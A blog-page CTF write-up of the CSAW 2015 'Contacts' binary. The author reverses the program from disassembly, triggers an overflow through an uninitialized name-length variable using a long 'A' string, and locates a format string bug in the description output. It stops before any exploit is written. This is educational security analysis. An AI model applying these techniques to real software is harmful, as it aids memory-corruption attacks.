<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>CSAW CTF 2015 - Contacts</title>
  <meta name="description" content="TL; DR  Overflow  Uninitialized Variable  Format String">

  <link href='https://fonts.googleapis.com/css?family=Open+Sans:600,700|Droid+Serif:400,700' rel='stylesheet' type='text/css'>
  
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/ctf/exploit/overflow/format-string/2015/09/28/csaw-ctf-contacts/">
  <link rel="alternate" type="application/rss+xml" title="Hello, and Thanks for All the Fish" href="http://localhost:4000/feed.xml">
</head>


  <body>
    <div class="site-wrap">
      <header class="site-header">
  <div class="wrapper">
    <a class="site-title" href="http://localhost:4000/">Hello, and Thanks for All the Fish</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        

        <a href="/feed.xml" class="page-link">RSS</a>
      </div>
    </nav>
  </div>
</header>


      <div class="page-content">
        <div class="wrapper">
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">CSAW CTF 2015 - Contacts</h1>
    <p class="post-meta"><time datetime="2015-09-28T05:00:00-07:00" itemprop="datePublished">September 28, 2015</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <h3 id="tl-dr">TL; DR</h3>
<ul>
  <li>Overflow</li>
  <li>Uninitialized Variable</li>
  <li>Format String</li>
</ul>

<p>CSAW CTF was a lot of fun this year (mostly because I was actually able to solve challenges ;D) and solving Contacts was pretty satisfying.</p>

<p>Let’s start by getting an idea what is up with it:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">vagrant@precise64:~/csawctf$ </span>file contacts
contacts: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0x9736c7a26b5c55f97874c5e62d359e02c88cf2f1, stripped</code></pre></figure>

<p>Alright, and the security mitigations it has:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">vagrant@precise64:~/csawctf$ </span>~/Template/checksec.sh --file contacts
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   contacts</code></pre></figure>

<p>Great, so it doesn’t look like we are bouta drop some shellcode or overflow some stack based buffer anytime soon (we could in certain situations find the stack canary either with a leak or <a href="http://hmarco.org/data/Preventing_brute_force_attacks_against_stack_canary_protection_on_networking_servers.pdf">brute force</a>).</p>

<p>So if we play around with this a bit, we get an idea as to what is going on:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">vagrant@precise64:~/csawctf$ </span>./contacts
Menu:
1<span class="o">)</span>Create contact
2<span class="o">)</span>Remove contact
3<span class="o">)</span>Edit contact
4<span class="o">)</span>Display contacts
5<span class="o">)</span>Exit</code></pre></figure>

<p>So we can create, remove, edit and display contacts. There are some things that we could look at first, the path that I first chose was looking at was the fact that you could specify how long your description was in your contact (this is a pretty common vuln in ctf problems).</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">&gt;&gt;&gt; </span>1
Contact info:
    Name: Poopy
<span class="o">[</span>DEBUG] Haven<span class="s1">'t written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 1231231234
    Length of description: 50
    Enter description:
        asdf</span></code></pre></figure>

<p>So if we look at the first place we can supply our description, it is a pretty clear that we will not be overflowing anything anytime soon as the program allocates based on the size we provide:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804884</span><span class="n">E</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>                <span class="c">; Destination of our size</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048852</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">aUC</span> <span class="c">; "%u%*c"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048859</span>                 <span class="k">call</span>    <span class="n">___isoc99_scanf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804885</span><span class="n">E</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048861</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048864</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">48</span><span class="n">h</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048867</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804886</span><span class="n">A</span>                 <span class="k">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804886</span><span class="n">D</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>      <span class="c">; size</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048870</span>                 <span class="k">call</span>    <span class="n">_malloc</span></code></pre></figure>

<p>and then reads into the allocated space the number of bytes we specify:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804889</span><span class="n">D</span>                 <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">stdin</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">A3</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="err">]</span> <span class="c">; Our size</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">A6</span>                 <span class="k">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">A9</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">AB</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">AE</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[eax]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">B0</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; stream</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">B4</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; n</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">B8</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>      <span class="c">; s</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080488</span><span class="n">BB</span>                 <span class="k">call</span>    <span class="n">_fgets</span></code></pre></figure>

<p>But what about when we edit our contact? Well it turns out that that the description is allocated and read in the same way as when we create the contact :C</p>

<p>When trying to solve a challenge with so many places to input data, it doesn’t hurt to make a guess as to a potential vulnerability even if it turns out to be a dead end, especially when you are pressed for time.</p>

<p>Let’s now checkout that innocent looking name input (really just going through all potential inputs at this point):</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D3</span> <span class="n">get_name</span>        <span class="n">proc</span> <span class="n">near</span>               <span class="c">; CODE XREF: add_contact+3Fp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D3</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D3</span> <span class="n">arg_0</span>           <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">8</span>
<span class="p">...</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">E5</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">stdin</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">EA</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">ED</span>                 <span class="k">add</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">8</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F0</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; stream</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F4</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="mi">64</span> <span class="c">; n</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">FC</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">edx</span>      <span class="c">; s</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">FF</span>                 <span class="k">call</span>    <span class="n">_fgets</span></code></pre></figure>

<p>Hmmm… what is arg_0 in <code class="highlighter-rouge">add_contact</code> (this was a stripped binary so these are names that I gave each function):</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B5E</span> <span class="n">add_contact</span>     <span class="n">proc</span> <span class="n">near</span>               <span class="c">; CODE XREF: main+B6p</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B5E</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B5E</span> <span class="n">var_10</span>          <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">10</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B5E</span> <span class="n">var_C</span>           <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">0</span><span class="n">Ch</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B5E</span> <span class="n">arg_0</span>           <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">8</span>
<span class="p">...</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B64</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B67</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">...</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B97</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B9A</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B9D</span>                 <span class="k">call</span>    <span class="n">get_name</span></code></pre></figure>

<p>What does main pass <code class="highlighter-rouge">add_contact</code> as a parameter then?</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804876</span><span class="n">C</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">unk_804B0A0</span> <span class="c">; jumptable 0804876A case 1</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048773</span>                 <span class="k">call</span>    <span class="n">add_contact</span></code></pre></figure>

<p>…where the fuck is <code class="highlighter-rouge">unk_804B0A0</code>?</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">bss</span><span class="o">:</span><span class="mi">0804</span><span class="n">B0A0</span> <span class="n">unk_804B0A0</span>     <span class="kt">db</span>    <span class="o">?</span> <span class="c">;               ; DATA XREF: main:loc_804876Co</span>
<span class="p">.</span><span class="n">bss</span><span class="o">:</span><span class="mi">0804</span><span class="n">B0A0</span>                                         <span class="c">; main:loc_804877Ao ...</span>
<span class="p">.</span><span class="n">bss</span><span class="o">:</span><span class="mi">0804</span><span class="n">B0A1</span>                 <span class="kt">db</span>    <span class="o">?</span> <span class="c">;</span>
<span class="p">.</span><span class="n">bss</span><span class="o">:</span><span class="mi">0804</span><span class="n">B0A2</span>                 <span class="kt">db</span>    <span class="o">?</span> <span class="c">;</span></code></pre></figure>

<p>Oh! So we read the name into the bss segment. If we do a little more reversing of the <code class="highlighter-rouge">add_contact</code> function, we realize that each contact is stored in the bss segment in a struct that resembles:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">contact</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">desc</span><span class="p">;</span>          <span class="c1">// Heap pointer
</span>    <span class="kt">char</span> <span class="o">*</span><span class="n">phone</span><span class="p">;</span>         <span class="c1">// Heap pointer
</span>    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">description_len</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">is_person</span><span class="p">;</span>       <span class="c1">// Used in print_contacts
</span><span class="p">}</span>

<span class="n">Total</span> <span class="n">bytes</span> <span class="k">for</span> <span class="n">a</span> <span class="n">contact</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">+</span> <span class="mi">64</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">=</span> <span class="mi">80</span> <span class="n">bytes</span></code></pre></figure>

<p>So as we add more contacts, we are adding to the contacts list located in the bss segment. So if we make 3 contacts, <code class="highlighter-rouge">0x0804B0A0</code> will look like:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x0804B0A0</span><span class="o">+</span><span class="mh">0x0</span>      <span class="n">Contact</span> <span class="mi">1</span>
<span class="mh">0x0804B0A0</span><span class="o">+</span><span class="mh">0x80</span>     <span class="n">Contact</span> <span class="mi">2</span>
<span class="mh">0x0804B0A0</span><span class="o">+</span><span class="mh">0x100</span>    <span class="n">Contact</span> <span class="mi">3</span></code></pre></figure>

<p>So when we initally create our contact, it reads the correct amount into our name buffer:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F4</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="mi">64</span> <span class="c">; n</span></code></pre></figure>

<p>But what about when we change our name…</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A4E</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">stdin</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A54</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">n</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A57</span>                 <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_54</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A5A</span>                 <span class="k">add</span>     <span class="n">ecx</span><span class="p">,</span> <span class="mi">8</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A5D</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; stream</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A61</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; n</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A65</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">ecx</span>      <span class="c">; s</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A68</span>                 <span class="k">call</span>    <span class="n">_fgets</span></code></pre></figure>

<p>Hmmm, that is a little strange. What is that <code class="highlighter-rouge">[ebp+n]</code> set to? If you look at all the times <code class="highlighter-rouge">[ebp+n]</code> is referenced in <code class="highlighter-rouge">edit_contact</code> you will find that it is only ever accessed and never assigned!</p>

<p><img src="https://i.imgur.com/YurOMQq.png" alt="uninitialized variable" /></p>

<p>That means that <code class="highlighter-rouge">[ebp+n]</code> is an uninitialized variable, meaning that whatever value that was left on the stack from a previous function call would be used as the value for <code class="highlighter-rouge">[ebp+n]</code>. I did not bother to really check what value would exactly be there, but if you shove a bunch of As in, you find out quickly that it is definetly a number bigger than 64:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Name to change? Dolan
1.Change name
2.Change description
<span class="gp">&gt;&gt;&gt; </span>1
New name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Menu:
1<span class="o">)</span>Create contact
2<span class="o">)</span>Remove contact
3<span class="o">)</span>Edit contact
4<span class="o">)</span>Display contacts
5<span class="o">)</span>Exit
<span class="gp">&gt;&gt;&gt; </span>4
Contacts:
    Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Length 1094795585
    Phone <span class="c">#: 8675309</span>
    Description: Drop it like it<span class="s1">'s hot
    Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Length 1337
Segmentation fault</span></code></pre></figure>

<p>Now what is important to realize is that you have to make a second contact because the crash is a result of you overflowing the name buffer of the first person all the way into a pointer of the second person. And when you go to print out the second person, the program doesn’t have access to the memory at <code class="highlighter-rouge">0x41414141</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  ESI: 0xFFFFCF88  EDI: 0x41414141
--------------------------------------------------------------------------[code]
<span class="gp">=&gt; </span>0xf7e64a6a &lt;vfprintf+9098&gt;:    repnz scas al,BYTE PTR es:[edi] ; Can<span class="s1">'t dereference edi, because edi = 0x41414141
--------------------------------------------------------------------------------
0xf7e64a6a in vfprintf () from /lib/i386-linux-gnu/libc.so.6
gdb$</span></code></pre></figure>

<p>So in our contacts list at the point of the crash, it would look something like:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">contact</span> <span class="mi">1</span><span class="o">:</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">desc</span>          <span class="o">=</span> <span class="n">some</span> <span class="n">pointer</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">phone</span>         <span class="o">=</span> <span class="n">some</span> <span class="n">pointer</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span>       <span class="o">=</span> <span class="n">AAAAAAAAAAAAA</span><span class="p">...</span> <span class="p">(</span><span class="n">repeats</span> <span class="mi">64</span> <span class="n">times</span><span class="p">)</span>
    <span class="kt">int</span> <span class="n">description_len</span> <span class="o">=</span> <span class="n">AAAA</span>
    <span class="kt">int</span> <span class="n">is_person</span>       <span class="o">=</span> <span class="n">AAAA</span>
<span class="n">contact</span> <span class="mi">2</span><span class="o">:</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">desc</span>          <span class="o">=</span> <span class="n">AAAA</span> <span class="o">&lt;--</span> <span class="n">Not</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">pointer</span> <span class="p">(</span><span class="n">will</span> <span class="n">crash</span> <span class="k">if</span> <span class="n">you</span> <span class="n">try</span> <span class="n">to</span> <span class="n">access</span> <span class="n">it</span><span class="p">)</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">phone</span>         <span class="o">=</span> <span class="n">AAAA</span> <span class="o">&lt;--</span> <span class="n">Not</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">pointer</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span>       <span class="o">=</span> <span class="n">AAAAAAAAAAAAA</span><span class="p">...</span> <span class="p">(</span><span class="n">repeats</span> <span class="mi">64</span> <span class="n">times</span><span class="p">)</span>
    <span class="kt">int</span> <span class="n">description_len</span> <span class="o">=</span> <span class="n">AAAA</span>
    <span class="kt">int</span> <span class="n">is_person</span>       <span class="o">=</span> <span class="n">AAAA</span></code></pre></figure>

<p>If we take a quick look at <code class="highlighter-rouge">print_contact</code> we see something interesting…</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BD7</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BDA</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BDE</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">aNameS</span> <span class="c">; "\tName: %s\n"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BE5</span>                 <span class="k">call</span>    <span class="n">_printf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BEA</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_4</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BED</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BF1</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">aLengthU</span> <span class="c">; "\tLength %u\n"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BF8</span>                 <span class="k">call</span>    <span class="n">_printf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">BFD</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_8</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C00</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C04</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">aPhoneS</span> <span class="c">; "\tPhone #: %s\n"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C0B</span>                 <span class="k">call</span>    <span class="n">_printf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C10</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">aDescription_0</span> <span class="c">; "\tDescription: "</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C17</span>                 <span class="k">call</span>    <span class="n">_printf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C1C</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">format</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C1F</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>      <span class="c">; format</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">C22</span>                 <span class="k">call</span>    <span class="n">_printf</span></code></pre></figure>

<p>A format string vulnerability at <code class="highlighter-rouge">.text:08048C22</code>! Cool, and if we look at the code, it looks like the description is the culprit.</p>

